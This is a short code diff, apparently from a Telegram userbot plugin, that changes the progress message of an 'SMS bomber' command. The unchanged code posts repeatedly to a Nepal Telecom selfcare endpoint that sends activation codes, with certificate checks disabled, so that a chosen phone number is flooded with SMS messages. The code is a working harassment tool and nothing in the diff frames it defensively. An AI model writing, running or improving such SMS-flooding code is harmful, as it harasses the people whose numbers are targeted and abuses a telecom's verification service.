@@ -17,7 +17,7 @@ async def _(event):
     await event.edit("`Bombing....`")
     for i in range (n):
         requests.post("https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do",params=paramss,verify=False)
-        await event.edit(f"`Bombing.... {n}")
+        await event.edit(f"`Bombing.... {i}`")
     await event.edit(f"`Bombed {n} SMS to {num}`")
 
     
